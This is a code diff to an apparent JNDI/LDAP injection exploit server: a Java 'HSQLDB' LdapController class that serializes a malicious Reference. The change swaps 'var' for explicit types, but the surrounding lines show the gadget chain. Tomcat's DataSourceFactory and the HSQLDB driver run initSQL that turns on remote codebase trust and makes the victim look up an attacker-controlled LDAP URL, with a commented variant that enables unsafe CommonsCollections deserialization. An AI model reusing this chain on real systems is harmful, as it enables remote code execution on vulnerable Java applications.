@@ -34,9 +34,9 @@ public class HSQLDB implements LdapController {
         // var reference = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null);
         // reference.add(new StringRefAddr("connectionInitSql", ""));
 
-        var payloadURL = "ldap://" + Config.hostname + ":" + Config.ldapPort + "/o=reference";
+        String payloadURL = "ldap://" + Config.hostname + ":" + Config.ldapPort + "/o=reference";
 
-        var reference = new Reference("javax.sql.DataSource", "org.apache.tomcat.jdbc.pool.DataSourceFactory", null);
+        Reference reference = new Reference("javax.sql.DataSource", "org.apache.tomcat.jdbc.pool.DataSourceFactory", null);
         reference.add(new StringRefAddr("driverClassName", "org.hsqldb.jdbc.JDBCDriver"));
         reference.add(new StringRefAddr("url", Config.jdbcURL));
         reference.add(new StringRefAddr("initSQL", "CALL \"java.lang.System.setProperty\"('com.sun.jndi.ldap.object.trustURLCodebase', 'true');" +
@@ -45,7 +45,7 @@ public class HSQLDB implements LdapController {
         // This could also be used, if CommonsCollections is in the classpath of the application in question.
         // reference.add(new StringRefAddr("initSQL", "CALL \"java.lang.System.setProperty\"('org.apache.commons.collections.enableUnsafeSerialization', 'true');CALL \"javax.naming.InitialContext.doLookup\"('ldap://192.168.0.166:1389/o=generic');"));
 
-        var e = new Entry(base);
+        Entry e = new Entry(base);
         e.addAttribute("javaClassName", "java.lang.String");
         e.addAttribute("javaSerializedData", serialize(reference));
 
